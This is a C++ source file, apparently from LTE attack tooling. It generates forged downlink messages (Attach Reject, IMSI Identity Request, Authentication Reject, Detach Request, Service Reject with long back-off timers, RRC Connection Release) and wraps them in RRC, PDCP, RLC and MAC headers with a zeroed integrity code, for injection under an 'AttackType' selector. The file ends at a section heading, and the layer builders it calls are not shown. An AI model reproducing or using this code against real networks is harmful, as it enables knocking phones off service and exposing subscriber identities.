// MsgGeneratorForNoSni.cc
#include "include/MsgGeneratorForNoSni.h"
#include <cstdio>
#include <cstdlib>
#define PCAP_CRNTI (0x1001)
#define PCAP_TTI (666)

void MsgGeneratorForNoSni::gen_mac_pdu(AttackType type, uint8_t* payload, uint32_t* payload_len, uint32_t set_emm_cause, uint32_t set_esm_cause) {
    switch (type) {
        case ATTACH_REJECT:
            emm_cause = set_emm_cause;
            gen_attach_reject_pdu(payload, payload_len);
            break;
        case IDENTITY_REQUEST:
            gen_identity_request_pdu(payload, payload_len);
            break;
        case AUTHEN_REQUEST:
            gen_authen_request_pdu(payload, payload_len);
            break;
        case AUTHEN_REJECT:
           gen_authen_reject_pdu(payload, payload_len);
            break;
        case ATTACH_ACCEPT:
            gen_attach_accept_pdu(payload, payload_len);
            break;
        case SEC_MOD_COMM:
            gen_sec_mod_comm_pdu(payload, payload_len);
            break;
        case RRC_CON_REL:
            gen_rrc_connection_release_pdu(payload, payload_len);
            break;
        case DETACH_ACCEPT:
            gen_detach_accept_pdu(payload, payload_len);
            break;
        case DETACH_REQUEST:
            emm_cause = set_emm_cause;
            gen_detach_request_pdu(payload, payload_len);
            break;
        case SERVICE_REJECT:
            emm_cause = set_emm_cause;
            gen_service_reject_pdu(payload, payload_len);
            break;
        case RRC_CON_REEST_REJECT:
            gen_rrc_connection_reest_reject_pdu(payload, payload_len);
            break;
        case PDN_REJECT:
            esm_cause = set_esm_cause;
            emm_cause = set_emm_cause;
            gen_pdn_connectivity_reject_pdu(payload, payload_len);
            break;
        default:
            fprintf(stderr, "[ERROR] Unknown attack type in MsgGeneratorForNoSni: %d\n", static_cast<int>(type));
            *payload_len = 0;
            // 注意：这里不再 exit(-1)，避免整个程序崩溃，由调用方处理
            return;
    }
}


// ========== 组合函数：从 NAS 到完整 MAC PDU，支持自定义 SN ==========
bool MsgGeneratorForNoSni::build_dl_mac_pdu_from_nas(
    srsran::unique_byte_buffer_t nas_pdu,
    uint32_t pdcp_sn,
    uint16_t rlc_sn,
    uint8_t pdcp_sn_len_bits,
    uint8_t* output_buffer,
    uint32_t* out_msg_len)
{
  // 1. RRC
  srsran::unique_byte_buffer_t rrc_pdu = srsran::make_byte_buffer();
  if (!rrc_pdu || !build_rrc_dl_info_transfer(std::move(nas_pdu), rrc_pdu)) {
    printf("RRC encoding failed\n");
    return false;
  }
  /*printf("RRC Message (%d bytes): ", rrc_pdu->N_bytes);
    for (uint32_t i = 0; i < rrc_pdu->N_bytes; ++i) {
    printf("%02x ", rrc_pdu->msg[i]);
  }
  printf("\n");*/

  // 2. PDCP (add header)
  if (!add_pdcp_header(rrc_pdu, pdcp_sn, pdcp_sn_len_bits)) {
    printf("PDCP header addition failed\n");
    return false;
  }

  // 3. Add dummy MAC-I (4 zero bytes)
  if (rrc_pdu->N_bytes + 4 > rrc_pdu->get_tailroom()) return false;
  memcpy(&rrc_pdu->msg[rrc_pdu->N_bytes], "\x00\x00\x00\x00", 4);
  rrc_pdu->N_bytes += 4;
  /*printf("PDCP Message (%d bytes): ", rrc_pdu->N_bytes);
  for (uint32_t i = 0; i < rrc_pdu->N_bytes; ++i) {
    printf("%02x ", rrc_pdu->msg[i]);
  }
  printf("\n");*/

  // 4. RLC
  size_t rlc_hdr_len = 2;
  uint8_t rlc_sdu[512]; // 足够大且固定
  if (rrc_pdu->N_bytes + rlc_hdr_len > 512) {
      printf("ERROR: RRC PDU too large!\n");
      return false;
  }
  size_t rlc_len = 0;
  if (!build_rlc_am_pdu(rrc_pdu, rlc_sn, rlc_sdu, sizeof(rlc_sdu), &rlc_len)) {
    printf("RLC encoding failed\n");
    return false;
  }
  /*printf("RLC Message (%zu bytes): ", rlc_len);
  for (size_t i = 0; i < rlc_len; ++i) {
      printf("%02x ", rlc_sdu[i]);
  }
  printf("\n");*/

  printf("Appending MAC header and generating MAC PDU\n");
  // 5. MAC
  if (!build_mac_pdu(rlc_sdu, rlc_len, output_buffer, out_msg_len)) {
    printf("MAC encoding failed\n");
    return false;
  }
  return true;
}

bool MsgGeneratorForNoSni::build_dl_mac_pdu_from_rrc(
    srsran::unique_byte_buffer_t rrc_pdu,
    uint32_t pdcp_sn,
    uint16_t rlc_sn,
    uint8_t pdcp_sn_len_bits,
    uint8_t* output_buffer,
    uint32_t* out_msg_len)
{

  /*printf("RRC Message (%d bytes): ", rrc_pdu->N_bytes);
    for (uint32_t i = 0; i < rrc_pdu->N_bytes; ++i) {
    printf("%02x ", rrc_pdu->msg[i]);
  }
  printf("\n");*/

  // 2. PDCP (add header)
  if (!add_pdcp_header(rrc_pdu, pdcp_sn, pdcp_sn_len_bits)) {
    printf("PDCP header addition failed\n");
    return false;
  }

  // 3. Add dummy MAC-I (4 zero bytes)
  if (rrc_pdu->N_bytes + 4 > rrc_pdu->get_tailroom()) return false;
  memcpy(&rrc_pdu->msg[rrc_pdu->N_bytes], "\x00\x00\x00\x00", 4);
  rrc_pdu->N_bytes += 4;
  /*printf("PDCP Message (%d bytes): ", rrc_pdu->N_bytes);
  for (uint32_t i = 0; i < rrc_pdu->N_bytes; ++i) {
    printf("%02x ", rrc_pdu->msg[i]);
  }
  printf("\n");*/

  // 4. RLC
  size_t rlc_hdr_len = 2;
  uint8_t rlc_sdu[512]; // 足够大且固定
  if (rrc_pdu->N_bytes + rlc_hdr_len > 512) {
      printf("ERROR: RRC PDU too large!\n");
      return false;
  }
  size_t rlc_len = 0;
  if (!build_rlc_am_pdu(rrc_pdu, rlc_sn, rlc_sdu, sizeof(rlc_sdu), &rlc_len)) {
    printf("RLC encoding failed\n");
    return false;
  }
  /*printf("RLC Message (%zu bytes): ", rlc_len);
  for (size_t i = 0; i < rlc_len; ++i) {
      printf("%02x ", rlc_sdu[i]);
  }
  printf("\n");*/

  printf("Appending MAC header and generating MAC PDU\n");
  // 5. MAC
  if (!build_mac_pdu(rlc_sdu, rlc_len, output_buffer, out_msg_len)) {
    printf("MAC encoding failed\n");
    return false;
  }
  return true;
}


// ========== 消息生成函数（调用组合函数） ==========
void MsgGeneratorForNoSni::gen_identity_request_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_identity_request_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate identity_request NAS\n");
      return;
  }
  /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
  for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
    printf("%02x ", nas_pdu->msg[i]);
  }
  printf("\n");*/

  if (!build_dl_mac_pdu_from_nas(
          std::move(nas_pdu),
          0,   // pdcp_sn
          0,  // rlc_sn
          5,   // pdcp_sn_len_bits
          buffer,
          msg_len)) {
      printf("Failed to build identity_request MAC PDU\n");
  }

  printf("==== MAC PDU (identity_request) ====\n");
  hexdump(buffer, *msg_len);  
}
/*
void MsgGeneratorForNoSni::gen_attach_reject_rrc_rel_pdu(uint8_t* buffer, uint32_t* msg_len) {

  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_attach_reject_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate attach_reject NAS\n");
      return;
  }
  srsran::unique_byte_buffer_t rrc_pdu = srsran::make_byte_buffer();
  if (!rrc_pdu || !build_rrc_dl_info_transfer_rrc_con_rel(std::move(nas_pdu), rrc_pdu)) {
    printf("RRC encoding failed\n");
  }
  if (!build_dl_mac_pdu_from_rrc(
    std::move(rrc_pdu),
    0,   // pdcp_sn
    0,  // rlc_sn
    5,   // pdcp_sn_len_bits
    buffer,
    msg_len)) {
    printf("Failed to build rrc_connection_release MAC PDU\n");
  }

  printf("==== MAC PDU (attach_reject_rrc_rel) ====\n");
  hexdump(buffer, *msg_len);  
}*/

void MsgGeneratorForNoSni::gen_attach_reject_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_attach_reject_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate attach_rejectNAS\n");
      return;
  }
  /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
  for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
    printf("%02x ", nas_pdu->msg[i]);
  }
  printf("\n");*/

  if (!build_dl_mac_pdu_from_nas(
          std::move(nas_pdu),
          0,   // pdcp_sn
          0,  // rlc_sn
          5,   // pdcp_sn_len_bits
          buffer,
          msg_len)) {
      printf("Failed to build attach_reject MAC PDU\n");
      return;
  }

  printf("==== MAC PDU (attach_reject) ====\n");
  hexdump(buffer, *msg_len);  
}

void MsgGeneratorForNoSni::gen_pdn_connectivity_reject_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_attach_reject_pdn_connectivity_reject_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate pdn_connectivity_reject NAS\n");
      return;
  }

  if (!build_dl_mac_pdu_from_nas(
          std::move(nas_pdu),
          0,   // pdcp_sn
          0,  // rlc_sn
          5,   // pdcp_sn_len_bits
          buffer,
          msg_len)) {
      printf("Failed to build pdn_connectivity_reject MAC PDU\n");
      return;
  }

  printf("==== MAC PDU (pdn_connectivity_reject) ====\n");
  hexdump(buffer, *msg_len);  

}

void MsgGeneratorForNoSni::gen_authen_reject_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_authen_reject_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate Authen Reject NAS\n");
      return;
  }
  if (!build_dl_mac_pdu_from_nas(
    std::move(nas_pdu),
    1,   // pdcp_sn
    1,  // rlc_sn
    5,   // pdcp_sn_len_bits
    buffer,
    msg_len)) {
    printf("Failed to build authen_request MAC PDU\n");
    return;
  }

  /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
  for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
    printf("%02x ", nas_pdu->msg[i]);
  }
  printf("\n");*/
  /*
  srsran::unique_byte_buffer_t rrc_pdu = srsran::make_byte_buffer();
  if (!rrc_pdu || !build_rrc_dl_info_transfer_rrc_con_rel(std::move(nas_pdu), rrc_pdu)) {
    printf("RRC encoding failed\n");
  }
  if (!build_dl_mac_pdu_from_rrc(
    std::move(rrc_pdu),
    0,   // pdcp_sn
    0,  // rlc_sn
    5,   // pdcp_sn_len_bits
    buffer,
    msg_len)) {
    printf("Failed to build rrc_connection_release MAC PDU\n");
  }
  */

  printf("==== MAC PDU (Authen Reject) ====\n");
  hexdump(buffer, *msg_len);  

}
void MsgGeneratorForNoSni::gen_authen_request_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_authen_request_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate authen_request NAS\n");
      return;
  }
  /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
  for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
    printf("%02x ", nas_pdu->msg[i]);
  }
  printf("\n");*/

  if (!build_dl_mac_pdu_from_nas(
          std::move(nas_pdu),
          0,   // pdcp_sn
          0,  // rlc_sn
          5,   // pdcp_sn_len_bits
          buffer,
          msg_len)) {
      printf("Failed to build authen_request MAC PDU\n");
      return;
  }

  printf("==== MAC PDU (authen_request) ====\n");
  hexdump(buffer, *msg_len);  
}
void MsgGeneratorForNoSni::gen_deactivate_eps_bearer_request_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_deactivate_eps_bearer_request_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate authen_request NAS\n");
      return;
  }
  /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
  for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
    printf("%02x ", nas_pdu->msg[i]);
  }
  printf("\n");*/

  if (!build_dl_mac_pdu_from_nas(
          std::move(nas_pdu),
          0,   // pdcp_sn
          0,  // rlc_sn
          5,   // pdcp_sn_len_bits
          buffer,
          msg_len)) {
      printf("Failed to build authen_request MAC PDU\n");
      return;
  }

  printf("==== MAC PDU (authen_request) ====\n");
  hexdump(buffer, *msg_len);  
}

void MsgGeneratorForNoSni::gen_attach_accept_pdu(uint8_t* buffer, uint32_t* msg_len) {
    srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
    gen_attach_accept_nas_plain(nas_pdu);
  
    if (nas_pdu->N_bytes == 0) {
        printf("Failed to generate attach_accept NAS\n");
        return;
    }
    /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
    for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
      printf("%02x ", nas_pdu->msg[i]);
    }
    printf("\n");*/
  
    if (!build_dl_mac_pdu_from_nas(
            std::move(nas_pdu),
            0,   // pdcp_sn
            0,  // rlc_sn
            5,   // pdcp_sn_len_bits
            buffer,
            msg_len)) {
        printf("Failed to build attach_accept MAC PDU\n");
        return;
    }
  
    printf("==== MAC PDU (attach_accept) ====\n");
    hexdump(buffer, *msg_len);  
  }


void MsgGeneratorForNoSni::gen_sec_mod_comm_pdu(uint8_t* buffer, uint32_t* msg_len) {
    srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
    gen_sec_mod_comm_nas(nas_pdu);

    if (nas_pdu->N_bytes == 0) {
        printf("Failed to generate security_mode_command NAS\n");
        return;
    }
    /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
    for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
        printf("%02x ", nas_pdu->msg[i]);
    }
    printf("\n");*/

    if (!build_dl_mac_pdu_from_nas(
            std::move(nas_pdu),
            0,   // pdcp_sn
            0,  // rlc_sn
            5,   // pdcp_sn_len_bits
            buffer,
            msg_len)) {
        printf("Failed to build security_mode_command MAC PDU\n");
        return;
    }

    printf("==== MAC PDU (security_mode_command) ====\n");
    hexdump(buffer, *msg_len);  
}
void MsgGeneratorForNoSni::gen_detach_accept_pdu(uint8_t* buffer, uint32_t* msg_len)
{
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_detach_accept_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate detach_accept NAS\n");
      return;
  }
  /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
  for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
    printf("%02x ", nas_pdu->msg[i]);
  }
  printf("\n");*/

  if (!build_dl_mac_pdu_from_nas(
          std::move(nas_pdu),
          0,   // pdcp_sn
          0,  // rlc_sn
          5,   // pdcp_sn_len_bits
          buffer,
          msg_len)) {
      printf("Failed to build detach_accept MAC PDU\n");
      return;
  }

  printf("==== MAC PDU (detach_accept) ====\n");
  hexdump(buffer, *msg_len);  
}
void MsgGeneratorForNoSni::gen_detach_request_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_detach_request_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate detach_request NAS\n");
      return;
  }
  /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
  for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
    printf("%02x ", nas_pdu->msg[i]);
  }
  printf("\n");*/

  if (!build_dl_mac_pdu_from_nas(
          std::move(nas_pdu),
          3,   // pdcp_sn
          3,  // rlc_sn
          5,   // pdcp_sn_len_bits
          buffer,
          msg_len)) {
      printf("Failed to build detach_request MAC PDU\n");
      return;
  }

  printf("==== MAC PDU (detach_request) ====\n");
  hexdump(buffer, *msg_len);  
}

void MsgGeneratorForNoSni::gen_service_reject_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_service_reject_nas(nas_pdu);

  if (nas_pdu->N_bytes == 0) {
      printf("Failed to generate service_reject NAS\n");
      return;
  }
  /*printf("NAS Message (%d bytes): ", nas_pdu->N_bytes);
  for (uint32_t i = 0; i < nas_pdu->N_bytes; ++i) {
    printf("%02x ", nas_pdu->msg[i]);
  }
  printf("\n");*/

  if (!build_dl_mac_pdu_from_nas(
          std::move(nas_pdu),
          0,   // pdcp_sn
          0,  // rlc_sn
          5,   // pdcp_sn_len_bits
          buffer,
          msg_len)) {
      printf("Failed to build service_reject MAC PDU\n");
  }

  printf("==== MAC PDU (service_reject) ====\n");
  hexdump(buffer, *msg_len);  
}

void MsgGeneratorForNoSni::gen_rrc_connection_release_pdu(uint8_t* buffer, uint32_t* msg_len)
{

  dl_dcch_msg_s dl_dcch_msg;
  auto& rrc_release = dl_dcch_msg.msg.set_c1().set_rrc_conn_release();
  rrc_release.rrc_transaction_id = 0;
  rrc_conn_release_r8_ies_s& rel_ies = rrc_release.crit_exts.set_c1().set_rrc_conn_release_r8();
  rel_ies.release_cause = asn1::rrc::release_cause_e::load_balancing_ta_urequired;
  
  srsran::unique_byte_buffer_t rrc_pdu = srsran::make_byte_buffer();
  asn1::bit_ref bref(rrc_pdu->msg, rrc_pdu->get_tailroom());
  if (dl_dcch_msg.pack(bref) != asn1::SRSASN_SUCCESS) {
    printf("Failed to build rrc_connection_release MAC PDU\n");

  }
  rrc_pdu->N_bytes = (uint32_t)bref.distance_bytes();

  
  
  if (!build_dl_mac_pdu_from_rrc(
    std::move(rrc_pdu),
    0,   // pdcp_sn
    0,  // rlc_sn
    5,   // pdcp_sn_len_bits
    buffer,
    msg_len)) {
    printf("Failed to build rrc_connection_release MAC PDU\n");
  }

    printf("==== MAC PDU (rrc_connection_release) ====\n");
    hexdump(buffer, *msg_len);  
}

void MsgGeneratorForNoSni::gen_rrc_connection_reest_reject_pdu(uint8_t* buffer, uint32_t* msg_len)
{

  dl_ccch_msg_s dl_ccch_msg;
  dl_ccch_msg.msg.set_c1().set_rrc_conn_reest_reject().crit_exts.set_rrc_conn_reest_reject_r8();

  srsran::unique_byte_buffer_t rrc_pdu = srsran::make_byte_buffer();
  asn1::bit_ref bref(rrc_pdu->msg, rrc_pdu->get_tailroom());
  if (dl_ccch_msg.pack(bref) != asn1::SRSASN_SUCCESS) {
    printf("Failed to build rrc_connection_release MAC PDU\n");

  }
  rrc_pdu->N_bytes = (uint32_t)bref.distance_bytes();
  
  if (!build_dl_mac_pdu_from_rrc(
    std::move(rrc_pdu),
    0,   // pdcp_sn
    0,  // rlc_sn
    5,   // pdcp_sn_len_bits
    buffer,
    msg_len)) {
    printf("Failed to build rrc_connection_release MAC PDU\n");
  }

    printf("==== MAC PDU (rrc_connection_release) ====\n");
    hexdump(buffer, *msg_len);  
}


void MsgGeneratorForNoSni::gen_pdn_connectivity_reject_nas(LIBLTE_BYTE_MSG_STRUCT* msg)
{
  LIBLTE_MME_GPRS_TIMER_3_STRUCT t3496_timer;
  t3496_timer.unit = 2;
  t3496_timer.value = 25;
  
  LIBLTE_MME_PDN_CONNECTIVITY_REJECT_MSG_STRUCT pdn_con_reject = {};
  pdn_con_reject.eps_bearer_id                                 = 0x0;
  pdn_con_reject.proc_transaction_id                           = 0x1;
  pdn_con_reject.esm_cause                                     = esm_cause;  
  pdn_con_reject.t3496_present = true;
  pdn_con_reject.t3496 = t3496_timer;
  liblte_mme_pack_pdn_connectivity_reject_msg(&pdn_con_reject, msg);
}

void MsgGeneratorForNoSni::gen_attach_reject_pdn_connectivity_reject_nas(srsran::unique_byte_buffer_t& msg)
{
  LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT attach_reject;
  bzero(&attach_reject, sizeof(LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT));
  attach_reject.emm_cause = emm_cause;
  //attach_reject.emm_cause = LIBLTE_MME_EMM_CAUSE_CONGESTION;
  printf("attach_reject.emm_cause = %d emm_cause = %d\n", attach_reject.emm_cause, emm_cause);
  attach_reject.t3446_value_present = true;
  attach_reject.t3446_value = 79;
  attach_reject.esm_msg_present = true;
  gen_pdn_connectivity_reject_nas(&attach_reject.esm_msg);
  liblte_mme_pack_attach_reject_msg(&attach_reject, (LIBLTE_BYTE_MSG_STRUCT*)msg.get());
}
void MsgGeneratorForNoSni::gen_attach_reject_nas(srsran::unique_byte_buffer_t& msg)
{
  LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT attach_reject;
  bzero(&attach_reject, sizeof(LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT));
  attach_reject.emm_cause = emm_cause;
  //attach_reject.emm_cause = LIBLTE_MME_EMM_CAUSE_CONGESTION;
  printf("attach_reject.emm_cause = %d emm_cause = %d\n", attach_reject.emm_cause, emm_cause);
  attach_reject.t3446_value_present = true;
  attach_reject.t3446_value = 79;
  liblte_mme_pack_attach_reject_msg(&attach_reject, (LIBLTE_BYTE_MSG_STRUCT*)msg.get());
}
void MsgGeneratorForNoSni::gen_identity_request_nas(srsran::unique_byte_buffer_t& msg) {
  LIBLTE_MME_ID_REQUEST_MSG_STRUCT id_req;
  id_req.id_type        = LIBLTE_MME_MOBILE_ID_TYPE_IMSI;
  LIBLTE_ERROR_ENUM err = liblte_mme_pack_identity_request_msg(&id_req, (LIBLTE_BYTE_MSG_STRUCT*)msg.get());
  if (err != LIBLTE_SUCCESS) {
    printf("Error packing Identity Request\n");
  }
}

void MsgGeneratorForNoSni::gen_authen_reject_nas(srsran::unique_byte_buffer_t& msg)
{
  LIBLTE_MME_AUTHENTICATION_REJECT_MSG_STRUCT auth_rej;
  LIBLTE_ERROR_ENUM err = liblte_mme_pack_authentication_reject_msg(&auth_rej, (LIBLTE_BYTE_MSG_STRUCT*)msg.get());
  if (err != LIBLTE_SUCCESS) {
    printf("Error packing Authentication Reject\n");
  }
}
void MsgGeneratorForNoSni::gen_authen_request_nas(srsran::unique_byte_buffer_t& msg)
{
    LIBLTE_MME_AUTHENTICATION_REQUEST_MSG_STRUCT auth_req = {};
    const char* autn_hex = "d13d035ee9d0e377fd82c98f5c6860f7";
    const char* rand_hex = "d13d035ee9d0e377fd82c98f5c6860f7";
    hex_string_to_byte_array(autn_hex, auth_req.autn);  // 直接写入 .autn
    hex_string_to_byte_array(rand_hex, auth_req.rand);  // 直接写入 .rand
    auth_req.nas_ksi.tsc_flag = LIBLTE_MME_TYPE_OF_SECURITY_CONTEXT_FLAG_NATIVE;
    auth_req.nas_ksi.nas_ksi  = 1;
    LIBLTE_ERROR_ENUM err = liblte_mme_pack_authentication_request_msg(&auth_req, (LIBLTE_BYTE_MSG_STRUCT*)msg.get());
    if (err != LIBLTE_SUCCESS) {
        printf("Error packing Authentication Request\n");
    }
}
void MsgGeneratorForNoSni::gen_deactivate_eps_bearer_request_nas(srsran::unique_byte_buffer_t& msg)
{
  //Deactivate EPS Bearer Context Request
  LIBLTE_MME_DEACTIVATE_EPS_BEARER_CONTEXT_REQUEST_MSG_STRUCT deactivate_eps_bearer_request; 
  deactivate_eps_bearer_request.proc_transaction_id = 0;
  deactivate_eps_bearer_request.eps_bearer_id = 5; // ✅ Default bearer
  deactivate_eps_bearer_request.protocol_cnfg_opts_present = false; // ✅ Simplified
  deactivate_eps_bearer_request.esm_cause = 36; // Request rejected, unspecified

    LIBLTE_ERROR_ENUM err = liblte_mme_pack_deactivate_eps_bearer_context_request_msg(&deactivate_eps_bearer_request, 
  LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS, 0, (LIBLTE_BYTE_MSG_STRUCT*)msg.get());
    if (err != LIBLTE_SUCCESS) {
        printf("Error packing Deactivate EPS Bearer Context Requestt\n");
    }
}

void MsgGeneratorForNoSni::gen_attach_accept_nas_plain(srsran::unique_byte_buffer_t& msg)
{
  const char* nas_hex = "0742013e060000f1100007001d5201c10107070673727361706e0501ac100002270880000d0408080808500bf600f11000011a791571281300f1";
  hex_string_to_byte_array(nas_hex, msg->msg);
  msg->N_bytes = strlen(nas_hex) / 2;
}

void MsgGeneratorForNoSni::gen_attach_accept_nas_inpro(srsran::unique_byte_buffer_t& msg)
{
  const char* nas_hex = "2710387f28020742013e060000f1100007001d5201c10107070673727361706e0501ac100002270880000d0408080808500bf600f11000011a4f0261241300f11000062305f44f026124";
  hex_string_to_byte_array(nas_hex, msg->msg);
  msg->N_bytes = strlen(nas_hex) / 2;
}
void MsgGeneratorForNoSni::gen_sec_mod_comm_nas(srsran::unique_byte_buffer_t& msg)
{
  const char* nas_hex = "37A593064D00075D220302F070";
  hex_string_to_byte_array(nas_hex, msg->msg);
  msg->N_bytes = strlen(nas_hex) / 2;
}
void MsgGeneratorForNoSni::gen_detach_accept_nas(srsran::unique_byte_buffer_t& msg)
{
    LIBLTE_MME_DETACH_ACCEPT_MSG_STRUCT detach_accept = {};
    LIBLTE_ERROR_ENUM err = liblte_mme_pack_detach_accept_msg(&detach_accept,
                                            LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS,
                                            1,
                                            (LIBLTE_BYTE_MSG_STRUCT*)msg.get());
}
void MsgGeneratorForNoSni::gen_detach_request_nas(srsran::unique_byte_buffer_t& msg) {
  const char* hex = "0745045303";
  msg->N_bytes = strlen(hex) / 2;
  hex_string_to_byte_array(hex, msg->msg);
}
void MsgGeneratorForNoSni::gen_service_reject_nas(srsran::unique_byte_buffer_t& msg) {
  LIBLTE_MME_SERVICE_REJECT_MSG_STRUCT service_rej;
  service_rej.t3442_present = true;
  service_rej.t3442.unit    = LIBLTE_MME_GPRS_TIMER_UNIT_6_MINUTES;
  service_rej.t3442.value   = 63;
  service_rej.t3446_present = true;
  service_rej.t3446         = 63;
  service_rej.emm_cause     = emm_cause;

  LIBLTE_ERROR_ENUM err = liblte_mme_pack_service_reject_msg(
      &service_rej, LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS, 0, (LIBLTE_BYTE_MSG_STRUCT*)msg.get());
  if (err != LIBLTE_SUCCESS) {
      printf("Error packing Service Reject\n");
  }
}




void MsgGeneratorForNoSni::hex_string_to_byte_array(const char *hex_string, uint8_t *byte_array) {
    size_t len = strlen(hex_string);
    for (size_t i = 0; i < len; i += 2) {
        sscanf(hex_string + i, "%2hhx", &byte_array[i / 2]);
    }
}
void MsgGeneratorForNoSni::print_hex_stream(const uint8_t* data, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        printf("%02X", data[i]);
    }
    printf("\n");
}
void MsgGeneratorForNoSni::hexdump(uint8_t* data, size_t length) {
    for (size_t i = 0; i < length; i += 16) {
        printf("%08zx: ", i);
        for (size_t j = 0; j < 16 && (i + j) < length; ++j) {
            printf("%02X ", data[i + j]);
        }
        printf("\n");
    }
    print_hex_stream(data, length);
    printf("\n");
}
inline uint32_t SN(uint32_t count)
{
  return count & (0xFFFFFFFF >> (32 - 5));
}
void MsgGeneratorForNoSni::uint16_to_uint8(uint16_t i, uint8_t* buf)
{
  buf[0] = (i >> 8) & 0xFF;
  buf[1] = i & 0xFF;
}

void MsgGeneratorForNoSni::uint24_to_uint8(uint32_t i, uint8_t* buf)
{
  buf[0] = (i >> 16) & 0xFF;
  buf[1] = (i >> 8) & 0xFF;
  buf[2] = i & 0xFF;
}

// ========== Layer 1: RRC Encapsulation ==========
bool MsgGeneratorForNoSni::build_rrc_dl_info_transfer(
  srsran::unique_byte_buffer_t nas_pdu,
    srsran::unique_byte_buffer_t& rrc_pdu)
{
  dl_dcch_msg_s dl_dcch_msg;
  dl_dcch_msg.msg.set_c1();
  auto& dl_info = dl_dcch_msg.msg.c1().set_dl_info_transfer();
  auto& r8 = dl_info.crit_exts.set_c1().set_dl_info_transfer_r8();
  r8.non_crit_ext_present = false;
  r8.ded_info_type.set_ded_info_nas();
  r8.ded_info_type.ded_info_nas().resize(nas_pdu->N_bytes);
  memcpy(r8.ded_info_type.ded_info_nas().data(), nas_pdu->msg, nas_pdu->N_bytes);

  asn1::bit_ref bref(rrc_pdu->msg, rrc_pdu->get_tailroom());
  if (dl_dcch_msg.pack(bref) != asn1::SRSASN_SUCCESS) {
    return false;
  }
  rrc_pdu->N_bytes = (uint32_t)bref.distance_bytes();
  return true;
}

bool MsgGeneratorForNoSni::build_rrc_dl_info_transfer_rrc_con_rel(
    srsran::unique_byte_buffer_t nas_pdu,
      srsran::unique_byte_buffer_t& rrc_pdu)
  {
    dl_dcch_msg_s dl_dcch_msg;
    
    if (nas_pdu && nas_pdu->N_bytes > 0) {
        // Case 1: 携带 NAS PDU → 构建 DLInformationTransfer
        auto& dl_info = dl_dcch_msg.msg.set_c1().set_dl_info_transfer();
        dl_info.rrc_transaction_id = 0; // 可选，通常为0
        auto& r8 = dl_info.crit_exts.set_c1().set_dl_info_transfer_r8();
        r8.ded_info_type.set_ded_info_nas();
        r8.ded_info_type.ded_info_nas().resize(nas_pdu->N_bytes);
        std::memcpy(r8.ded_info_type.ded_info_nas().data(), nas_pdu->msg, nas_pdu->N_bytes);
    }
      
    auto& rrc_release = dl_dcch_msg.msg.set_c1().set_rrc_conn_release();
    rrc_release.rrc_transaction_id = 0;
    auto& rel_ies = rrc_release.crit_exts.set_c1().set_rrc_conn_release_r8();
    rel_ies.release_cause = asn1::rrc::release_cause_e::other;

    asn1::bit_ref bref(rrc_pdu->msg, rrc_pdu->get_tailroom());
    if (dl_dcch_msg.pack(bref) != asn1::SRSASN_SUCCESS) {
    printf("Failed to pack RRC DL-DCCH message\n");
    return false;
    }
    rrc_pdu->N_bytes = static_cast<uint32_t>(bref.distance_bytes());

    return true;

}

// ========== Layer 2: PDCP Header (with configurable SN) ==========
